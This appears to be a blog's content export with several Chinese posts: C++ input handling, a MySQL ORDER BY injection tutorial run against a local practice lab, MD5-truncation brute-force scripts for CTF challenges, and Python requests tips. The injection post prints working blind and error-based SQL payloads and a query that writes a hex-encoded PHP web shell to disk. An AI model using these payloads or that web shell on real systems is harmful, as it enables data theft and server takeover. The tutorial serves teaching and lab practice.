class=\"line\">&#123;</span><br><span class=\"line\">char ch;</span><br><span class=\"line\">//或者cin.get(ch);</span><br><span class=\"line\">ch=cin.get();</span><br><span class=\"line\">cout&lt;&lt;ch&lt;&lt;endl;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">输入：jljkljkl</span><br><span class=\"line\">输出：j</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#include &lt;iostream&gt;</span><br><span class=\"line\">using namespace std;</span><br><span class=\"line\">main ()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">char a[20];</span><br><span class=\"line\">cin.get(a,20);</span><br><span class=\"line\">cout&lt;&lt;a&lt;&lt;endl;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">输入：jkl jkl jkl</span><br><span class=\"line\">输出：jkl jkl jkl</span><br></pre></td></tr></table></figure>\n<ul>\n<li>cin.getline()   </li>\n</ul>\n<blockquote>\n<p>getline (char* s, streamsize n, char delim );</p>\n</blockquote>\n<p>接受一个字符串，可以接收空格并输出</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#include &lt;iostream&gt;</span><br><span class=\"line\">using namespace std;</span><br><span class=\"line\">main ()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">char m[20];</span><br><span class=\"line\">cin.getline(m,5);</span><br><span class=\"line\">cout&lt;&lt;m&lt;&lt;endl;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">输入：jkljkljkl</span><br><span class=\"line\">输出：jklj</span><br></pre></td></tr></table></figure>\n<ul>\n<li>getline</li>\n</ul>\n<blockquote>\n<p>getline (istream&amp; is, string&amp; str, char delim);</p>\n</blockquote>\n<p><code>需包含“#include &lt;string&gt;”</code>, 接受一个字符串，可以接收空格并输出</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#include&lt;iostream&gt;</span><br><span class=\"line\">#include&lt;string&gt;</span><br><span class=\"line\">using namespace std;</span><br><span class=\"line\">main ()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">string str;</span><br><span class=\"line\">getline(cin,str);</span><br><span class=\"line\">cout&lt;&lt;str&lt;&lt;endl;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">输入：jkljkljkl</span><br><span class=\"line\">输出：jkljkljkl</span><br></pre></td></tr></table></figure>\n<h4 id=\"每行一个数据\"><a href=\"#每行一个数据\" class=\"headerlink\" title=\"每行一个数据\"></a>每行一个数据</h4><p>每行一个数据可以用<code>cin</code>读取，cin读取的是一行的内容，而且还可以指定数据格式</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">input:</span><br><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\"></span><br><span class=\"line\">int a, b, c;</span><br><span class=\"line\">cin &gt;&gt; q &gt;&gt; b &gt;&gt; c;</span><br></pre></td></tr></table></figure>\n<h4 id=\"输入数据用-分隔\"><a href=\"#输入数据用-分隔\" class=\"headerlink\" title=\"输入数据用 , 分隔\"></a>输入数据用 <code>,</code> 分隔</h4><p>这种情况下并不能用<code>cin</code>读数据。</p>\n<p>方式一: 使用<code>getline</code></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">input:</span><br><span class=\"line\">123,234</span><br><span class=\"line\"></span><br><span class=\"line\">string a, b;</span><br><span class=\"line\">getline(cin, a, &apos;,&apos;);</span><br><span class=\"line\">getline(cin, b);</span><br></pre></td></tr></table></figure>\n<h2 id=\"字符串操作\"><a href=\"#字符串操作\" class=\"headerlink\" title=\"字符串操作\"></a>字符串操作</h2><h3 id=\"逆序\"><a href=\"#逆序\" class=\"headerlink\" title=\"逆序\"></a>逆序</h3><ul>\n<li>reverse()</li>\n</ul>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#include &lt;algorithm&gt;</span><br><span class=\"line\">#include &lt;string&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">string a;</span><br><span class=\"line\">cin &gt;&gt; a;</span><br><span class=\"line\">reverse(a.begin(), a.end());</span><br><span class=\"line\">cout &lt;&lt; a &lt;&lt; endl;</span><br><span class=\"line\"></span><br><span class=\"line\">输入：123</span><br><span class=\"line\">输出：321</span><br></pre></td></tr></table></figure>\n<h3 id=\"类型转换\"><a href=\"#类型转换\" class=\"headerlink\" title=\"类型转换\"></a>类型转换</h3><ul>\n<li>数字转字符串</li>\n</ul>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#include &lt;string&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">int a;</span><br><span class=\"line\">string sa;</span><br><span class=\"line\">sa = to_string(a);</span><br></pre></td></tr></table></figure>\n<ul>\n<li>字符串转数字</li>\n</ul>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#include &lt;string&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">int a;</span><br><span class=\"line\">string sa;</span><br><span class=\"line\">a = stoi(sa);</span><br></pre></td></tr></table></figure>\n","categories":["杂项"],"tags":["在线编程"]},{"title":"MySQL注入系列之order by 注入(二)","url":"http://www.beesfun.com/2017/03/22/MySQL注入系列之order-by-注入-二/","content":"<h2 id=\"order-by-基础知识\"><a href=\"#order-by-基础知识\" class=\"headerlink\" title=\"order by 基础知识\"></a>order by 基础知识</h2><p><code>ORDER BY {col_name | expr | position}</code>, order by 后面可以跟字段名，表达式和字段的位置，字段的位置需要是整数型。</p>\n<a id=\"more\"></a>\n<h2 id=\"实验环境\"><a href=\"#实验环境\" class=\"headerlink\" title=\"实验环境\"></a>实验环境</h2><p>本地搭建 <a href=\"https://github.com/Audi-1/sqli-labs\" target=\"_blank\" rel=\"noopener\">sqli-lab</a> 环境，选取lesson-52作为盲注测试目标</p>\n<ul>\n<li><p>lesson-52 核心代码</p>\n  <figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$id=$_GET[<span class=\"string\">'sort'</span>];    </span><br><span class=\"line\"><span class=\"keyword\">if</span>(<span class=\"keyword\">isset</span>($id))</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    ...</span><br><span class=\"line\">    $sql=<span class=\"string\">\"SELECT * FROM users ORDER BY $id\"</span>;</span><br></pre></td></tr></table></figure>\n</li>\n</ul>\n<p>使用<code>asc</code>和<code>desc</code>关键词测试是否为order by 注入，根据下面结果可以得知注入点为order by注入</p>\n<img src=\"/2017/03/22/MySQL注入系列之order-by-注入-二/asc.png\">\n<img src=\"/2017/03/22/MySQL注入系列之order-by-注入-二/desc.png\">\n<h2 id=\"order-by-注入\"><a href=\"#order-by-注入\" class=\"headerlink\" title=\"order by 注入\"></a>order by 注入</h2><p>基于 order by 的注入有盲注和报错注入</p>\n<h2 id=\"order-by-盲注\"><a href=\"#order-by-盲注\" class=\"headerlink\" title=\"order by 盲注\"></a>order by 盲注</h2><h3 id=\"需要知道字段名\"><a href=\"#需要知道字段名\" class=\"headerlink\" title=\"需要知道字段名\"></a>需要知道<code>字段名</code></h3><p>需要<code>字段名</code>的情况通常是，执行了查询语句，然后根据查询结果排序的差别进行盲注</p>\n<ul>\n<li>使用 if(1&lt;2, id, username)或者类似的表达式来布尔盲注或者时间盲注</li>\n</ul>\n<p>条件判断之后需要选择字段名，如: id，username，而不能是1，2等表示字段的位置的数字，因为1，2会被判断为字符返回，而不是整数类型，所以必须知道字段名。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">case when (true) then id else username end</span><br><span class=\"line\"></span><br><span class=\"line\">if((select ascii(substr(table_name,1,1)) from information_schema.tables limit 1)&lt;=128,id,username)</span><br></pre></td></tr></table></figure>\n<h3 id=\"不需要知道字段名\"><a href=\"#不需要知道字段名\" class=\"headerlink\" title=\"不需要知道字段名\"></a>不需要知道<code>字段名</code></h3><ul>\n<li>引起mysql错误进行盲注</li>\n</ul>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">if(1=0,1,(select 1 from information_schema.tables))</span><br><span class=\"line\">case when(2&lt;1) then 1 else 1*(select 1 from information_schema.tables)end)=1</span><br></pre></td></tr></table></figure>\n<p>条件为false是，值为<code>select 1 from information_schema.tables</code>，mysql会报错: <code>Subquery returns more than 1 row</code>, 导致查询结果为空.</p>\n<p>这样就可以根据查询结果是否为空，判断条件的真假</p>\n<ul>\n<li>基于时间的盲注</li>\n</ul>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">if(1,sleep(3),1)</span><br></pre></td></tr></table></figure>\n<ul>\n<li>基于rand()的盲注</li>\n</ul>\n<p><code>order by rand(true);</code> <code>order by rand(false);</code> 返回不同进行盲注。原理是 order by rand()会随机给每个数据生成一个随机数，然后按照随机数排序，true和false实际上转成了整形的1和0作为rand()的种子，这样给每一列都会成一个固定的数，然后根据这个数来排序，所以结果会不同。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">rand(ascii(mid(database(),1,1))=109)</span><br></pre></td></tr></table></figure>\n<h2 id=\"order-by-报错注入\"><a href=\"#order-by-报错注入\" class=\"headerlink\" title=\"order by 报错注入\"></a>order by 报错注入</h2><h3 id=\"procedure-存储过程\"><a href=\"#procedure-存储过程\" class=\"headerlink\" title=\"procedure 存储过程\"></a>procedure 存储过程</h3><ul>\n<li>支持报错</li>\n</ul>\n<p>本地测试没成功，可能和mysql版本有关</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mysql&gt; SELECT 1 from mysql.user order by 1 limit 0,1 procedure analyse(extractvalue(rand(),concat(0x3a,version())),1);</span><br><span class=\"line\">ERROR 1105 (HY000): XPATH syntax error: &apos;:5.1.73-log&apos;</span><br></pre></td></tr></table></figure>\n<ul>\n<li>不支持报错，用time-based</li>\n</ul>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mysql&gt; SELECT 1 from mysql.user order by 1 limit 0,1 PROCEDURE analyse((select extractvalue(rand(),concat(0x3a,(IF(MID(version(),1,1) LIKE 5, BENCHMARK(50000000,SHA1(1)),1))))),1);</span><br><span class=\"line\">ERROR 1105 (HY000): XPATH syntax error: &apos;:0&apos;</span><br></pre></td></tr></table></figure>\n<ul>\n<li>GETSHELL：</li>\n</ul>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mysql&gt; SELECT 1 from mysql.user order by 1 limit 0,1 into outfile &apos;/tmp/2.php&apos; LINES TERMINATED BY 0x3C3F7068702061737365727428245F504F53545B70765D293B3F3E;</span><br><span class=\"line\">Query OK, 1 row affected (0.00 sec)</span><br></pre></td></tr></table></figure>\n","categories":["Web安全"],"tags":["MySQL注入","order by"]},{"title":"【CTF】MD5截断比较","url":"http://www.beesfun.com/2017/03/21/【CTF】MD5截断比较/","content":"<h2 id=\"md5-截断验证\"><a href=\"#md5-截断验证\" class=\"headerlink\" title=\"md5 截断验证\"></a>md5 截断验证</h2><p>ctf中经常用MD5的截断比较做验证，如:<code>substr(md5($str), 0, 6) === &quot;3322cf&quot;</code>,通过这种方式限制脚本的自动化攻击。</p>\n<p>通常可以写脚本去爆破MD5, 但是花费时间和比较字符串的长度有关，并且花费时间通常比较长，这不利于脚本自动攻击，下面给出爆破脚本和使用方式。</p>\n<a id=\"more\"></a>\n<ul>\n<li>submd5.py</li>\n</ul>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># -*- coding: utf-8 -*-</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> multiprocessing</span><br><span class=\"line\"><span class=\"keyword\">import</span> hashlib</span><br><span class=\"line\"><span class=\"keyword\">import</span> random</span><br><span class=\"line\"><span class=\"keyword\">import</span> string</span><br><span class=\"line\"><span class=\"keyword\">import</span> sys</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">CHARS = string.letters + string.digits</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">cmp_md5</span><span class=\"params\">(substr, stop_event, str_len, start=<span class=\"number\">0</span>, size=<span class=\"number\">20</span>)</span>:</span></span><br><span class=\"line\">    <span class=\"keyword\">global</span> CHARS</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">while</span> <span class=\"keyword\">not</span> stop_event.is_set():</span><br><span class=\"line\">        rnds = <span class=\"string\">''</span>.join(random.choice(CHARS) <span class=\"keyword\">for</span> _ <span class=\"keyword\">in</span> range(size))</span><br><span class=\"line\">        md5 = hashlib.md5(rnds)</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">if</span> md5.hexdigest()[start: start+str_len] == substr:</span><br><span class=\"line\">            <span class=\"keyword\">print</span> rnds</span><br><span class=\"line\">            stop_event.set()</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">'__main__'</span>:</span><br><span class=\"line\">    substr = sys.argv[<span class=\"number\">1</span>].strip()</span><br><span class=\"line\"></span><br><span class=\"line\">    start_pos = int(sys.argv[<span class=\"number\">2</span>]) <span class=\"keyword\">if</span> len(sys.argv) &gt; <span class=\"number\">1</span> <span class=\"keyword\">else</span> <span class=\"number\">0</span></span><br><span class=\"line\"></span><br><span class=\"line\">    str_len = len(substr)</span><br><span class=\"line\">    cpus = multiprocessing.cpu_count()</span><br><span class=\"line\">    stop_event = multiprocessing.Event()</span><br><span class=\"line\">    processes = [multiprocessing.Process(target=cmp_md5, args=(substr,</span><br><span class=\"line\">                                         stop_event, str_len, start_pos))</span><br><span class=\"line\">                 <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(cpus)]</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">for</span> p <span class=\"keyword\">in</span> processes:</span><br><span class=\"line\">        p.start()</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">for</span> p <span class=\"keyword\">in</span> processes:</span><br><span class=\"line\">        p.join()</span><br></pre></td></tr></table></figure>\n<p>用法:</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ python submd5.py &quot;3d4f4&quot;</span><br><span class=\"line\">SponhjOhIZ30IaM1fweb</span><br><span class=\"line\"></span><br><span class=\"line\">$ python submd5.py &quot;3df4&quot; 2</span><br><span class=\"line\">G8tr6VhonA1z3xJdaGBu</span><br></pre></td></tr></table></figure>\n<p>想要在较短时间内获得可用的md5,可以使用彩虹表类似的方式去实现，通过空间去换时间。</p>\n<p>生成md5文件，并排序:</p>\n<ul>\n<li>gen_md5.py</li>\n</ul>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># -*- coding: utf-8 -*-</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> itertools</span><br><span class=\"line\"><span class=\"keyword\">import</span> hashlib</span><br><span class=\"line\"><span class=\"keyword\">import</span> string</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">CHARS = string.letters + string.digits</span><br><span class=\"line\">str_len = <span class=\"number\">8</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> s <span class=\"keyword\">in</span> itertools.product(CHARS, repeat=str_len):</span><br><span class=\"line\">    s = <span class=\"string\">''</span>.join(s)</span><br><span class=\"line\">    <span class=\"keyword\">print</span> <span class=\"string\">\"&#123;0&#125; &#123;1&#125;\"</span>.format(hashlib.md5(s).hexdigest(), s)</span><br></pre></td></tr></table></figure>\n<p>命令行排序: <code>python gen_md5.py | sort -o md5_sorted.txt</code></p>\n<p>md5 文件搜索(二分查找):</p>\n<ul>\n<li>match.py</li>\n</ul>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># -*- coding: utf-8 -*-</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> itertools</span><br><span class=\"line\"><span class=\"keyword\">import</span> hashlib</span><br><span class=\"line\"><span class=\"keyword\">import</span> string</span><br><span class=\"line\"><span class=\"keyword\">import</span> os</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">match</span><span class=\"params\">(s)</span>:</span></span><br><span class=\"line\">    md5_file = <span class=\"string\">\"md5_sorted.txt\"</span></span><br><span class=\"line\">    byte_size = os.path.getsize(md5_file)</span><br><span class=\"line\">    <span class=\"keyword\">with</span> open(md5_file, <span class=\"string\">'rb'</span>) <span class=\"keyword\">as</span> f:</span><br><span class=\"line\">        line_len = len(f.readline())</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">print</span> line_len</span><br><span class=\"line\">    <span class=\"keyword\">with</span> open(md5_file, <span class=\"string\">\"rb\"</span>) <span class=\"keyword\">as</span> f:</span><br><span class=\"line\">      L = <span class=\"number\">0</span></span><br><span class=\"line\">      R = byte_size / line_len - <span class=\"number\">1</span></span><br><span class=\"line\"></span><br><span class=\"line\">      <span class=\"keyword\">while</span> R - L &gt; <span class=\"number\">0</span>:</span><br><span class=\"line\">        C = L + (R - L) / <span class=\"number\">2</span></span><br><span class=\"line\">        offset = C * line_len</span><br><span class=\"line\">        f.seek(offset)</span><br><span class=\"line\">        ln = f.read(line_len).strip()</span><br><span class=\"line\">        <span class=\"comment\">#print ln</span></span><br><span class=\"line\"></span><br><span class=\"line\">        head = ln[:len(s)]</span><br><span class=\"line\">        <span class=\"keyword\">if</span> s == head:</span><br><span class=\"line\">          <span class=\"keyword\">return</span> ln.split(<span class=\"string\">\" \"</span>)[<span class=\"number\">1</span>]</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">if</span> s &lt; head:</span><br><span class=\"line\">          R = C</span><br><span class=\"line\">          <span class=\"keyword\">continue</span></span><br><span class=\"line\"></span><br><span class=\"line\">        L = C</span><br><span class=\"line\"></span><br><span class=\"line\">      <span class=\"keyword\">return</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># print match('fef')</span></span><br></pre></td></tr></table></figure>\n","categories":["CTF"],"tags":["md5"]},{"title":"requests手动修改Content-Length头","url":"http://www.beesfun.com/2017/03/21/requests手动修改Content-Length头/","content":"<h2 id=\"requests发送前修改请求信息\"><a href=\"#requests发送前修改请求信息\" class=\"headerlink\" title=\"requests发送前修改请求信息\"></a>requests发送前修改请求信息</h2><p>requests可以再发送请求前，修改请求信息，见<a href=\"http://docs.python-requests.org/en/latest/user/advanced/#prepared-requests\" target=\"_blank\" rel=\"noopener\">Prepared Requests</a></p>\n<a id=\"more\"></a>\n<p>例如发送前手动修改请求头<code>Content-Length</code></p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">from</span> requests <span class=\"keyword\">import</span> Request, Session</span><br><span class=\"line\"></span><br><span class=\"line\">s = Session()</span><br><span class=\"line\">req = Request(<span class=\"string\">'POST'</span>, url, data=data, headers=headers)</span><br><span class=\"line\">prepped = req.prepare()</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># do something with prepped.headers</span></span><br><span class=\"line\">prepped.headers[<span class=\"string\">'Content-Length'</span>] = your_custom_content_length_calculation()</span><br><span class=\"line\"><span class=\"comment\"># prepped.headers['Content-Length'] = '1000000000'</span></span><br><span class=\"line\"></span><br><span class=\"line\">resp = s.send(prepped)</span><br></pre></td></tr></table></figure>\n<p>如果<code>session</code>有自己的配置，如cookie等，应该使用<code>s.prepare_request(req)</code>, 而不是<code>req.prepare()</code></p>\n","categories":["Python"],"tags":["requests"]},{"title":"MySQL注入系列之基础知识(一)","url":"http://www.beesfun.com/2017/03/19/MySQL注入系列之基础知识-一/","content":"<h2 id=\"select-语法\"><a href=\"#select-语法\" class=\"headerlink\" title=\"select 语法\"></a>select 语法</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">SELECT</span><br><span class=\"line\">[ALL | DISTINCT | DISTINCTROW ]</span><br><span class=\"line\">  [HIGH_PRIORITY]</span><br><span class=\"line\">  [STRAIGHT_JOIN]</span><br><span class=\"line\">  [SQL_SMALL_RESULT] [SQL_BIG_RESULT] [SQL_BUFFER_RESULT]</span><br><span class=\"line\">  [SQL_CACHE | SQL_NO_CACHE] [SQL_CALC_FOUND_ROWS]</span><br><span class=\"line\">select_expr [, select_expr ...]</span><br><span class=\"line\">[FROM table_references</span><br><span class=\"line\">[WHERE where_condition]</span><br><span class=\"line\">[GROUP BY &#123;col_name | expr | position&#125;</span><br><span class=\"line\">  [ASC | DESC], ... [WITH ROLLUP]]</span><br><span class=\"line\">[HAVING where_condition]</span><br><span class=\"line\">[ORDER BY &#123;col_name | expr | position&#125;</span><br><span class=\"line\">  [ASC | DESC], ...]</span><br><span class=\"line\">[LIMIT &#123;[offset,] row_count | row_count OFFSET offset&#125;]</span><br><span class=\"line\">[PROCEDURE procedure_name(argument_list)]</span><br><span class=\"line\">[INTO OUTFILE &apos;file_name&apos; export_options</span><br><span class=\"line\">  | INTO DUMPFILE &apos;file_name&apos;</span><br><span class=\"line\">  | INTO var_name [, var_name]]</span><br><span class=\"line\">[FOR UPDATE | LOCK IN SHARE MODE]]</span><br></pre></td></tr></table></figure>\n<a id=\"more\"></a>\n<h2 id=\"基础函数\"><a href=\"#基础函数\" class=\"headerlink\" title=\"基础函数\"></a>基础函数</h2><p><a href=\"https://dev.mysql.com/doc/refman/5.7/en/string-functions.html\" target=\"_blank\" rel=\"noopener\">doc mysql 5.7 string-functions</a></p>\n<div class=\"table-container\">\n<table>\n<thead>\n<tr>\n<th>函数</th>\n<th>功能</th>\n<th>备注</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>concat</td>\n<td>返回连接参数产生的字符串</td>\n<td>如果其中一个参数为null，则返回值为null</td>\n</tr>\n<tr>\n<td>concat_ws</td>\n<td>返回连接参数产生的字符串</td>\n<td>CONCAT_WS(sp,s1,…)<br> 第一个参数是分隔符，剩下的参数就是字段名</td>\n</tr>\n<tr>\n<td>group_concat</td>\n<td>合并多条记录中的结果</td>\n<td></td>\n</tr>\n<tr>\n<td>if</td>\n<td></td>\n<td>if(exp1,exp2,exp2)<br> 